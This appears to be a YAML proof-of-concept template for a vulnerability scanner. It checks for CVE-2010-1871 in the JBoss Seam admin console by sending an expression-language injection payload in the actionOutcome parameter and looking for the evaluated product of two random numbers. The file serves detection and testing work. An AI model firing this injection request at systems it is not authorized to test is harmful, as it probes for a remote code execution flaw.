name: poc-yaml-jboss-cve-2010-1871
set:
  r1: randomInt(8000000, 10000000)
  r2: randomInt(8000000, 10000000)
rules:
  - method: GET
    path: /admin-console/index.seam?actionOutcome=/pwn.xhtml%3fpwned%3d%23%7b{{r1}}*{{r2}}%7d
    follow_redirects: false
    expression: |
      response.status == 302 && response.headers["location"].contains(string(r1 * r2))
detail:
  author: fuping
  links:
    - http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1871